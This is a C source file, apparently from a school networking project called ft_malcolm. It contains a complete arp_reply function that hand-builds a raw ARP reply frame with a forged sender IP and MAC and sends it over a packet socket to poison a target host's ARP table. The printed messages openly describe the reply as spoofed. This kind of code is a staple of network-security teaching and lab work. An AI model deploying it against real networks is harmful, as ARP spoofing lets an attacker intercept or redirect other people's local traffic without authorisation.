#include "../includes/ft_malcolm.h"

static int hex_digit(char c) {
    if (c >= '0' && c <= '9')
        return c - '0';
    if (c >= 'a' && c <= 'f')
        return c - 'a' + 10;
    return c - 'A' + 10;
}


int arp_reply(int fd, char **av, int ifindex) {
    unsigned char frame[60] = {0};
    struct sockaddr_ll destination = {0};
    struct in_addr source_ip;
    struct in_addr target_ip;
    const unsigned char *source_bytes;
    const unsigned char *target_bytes;
    ssize_t sent;
    int i;

    if (ifindex <= 0)
        return error_msg("Error: invalid outgoing interface.\n");
    if (inet_pton(AF_INET, av[1], &source_ip) != 1 || inet_pton(AF_INET, av[3], &target_ip) != 1)
        return error_msg("Error: invalid reply IPv4 address.\n");
    destination.sll_family = AF_PACKET;
    destination.sll_protocol = htons(ETH_P_ARP);
    destination.sll_ifindex = ifindex;
    destination.sll_halen = 6;
    i = 0;
    while (i < 6) {
        frame[i] = hex_digit(av[4][i * 3]) * 16 + hex_digit(av[4][i * 3 + 1]);
        frame[6 + i] = hex_digit(av[2][i * 3]) * 16 + hex_digit(av[2][i * 3 + 1]);
        frame[22 + i] = frame[6 + i];
        frame[32 + i] = frame[i];
        destination.sll_addr[i] = frame[i];
        i++;
    }
    frame[12] = 0x08;
    frame[13] = 0x06;
    frame[15] = 0x01;
    frame[16] = 0x08;
    frame[18] = 6;
    frame[19] = 4;
    frame[21] = 0x02;
    source_bytes = (const unsigned char *)&source_ip.s_addr;
    target_bytes = (const unsigned char *)&target_ip.s_addr;
    i = 0;
    while (i < 4) {
        frame[28 + i] = source_bytes[i];
        frame[38 + i] = target_bytes[i];
        i++;
    }
    /* 42 bytes of headers plus padding; the interface supplies the Ethernet FCS. */
    printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
    sent = sendto(fd, frame, sizeof(frame), 0, (const struct sockaddr *)&destination, sizeof(destination));
    if (sent < 0) {
        fprintf(stderr, "Error: sendto: %s\n", strerror(errno));
        return TRUE;
    }
    if ((size_t)sent != sizeof(frame))
        return error_msg("Error: incomplete ARP reply transmission.\n");
    printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
    return FALSE;
}
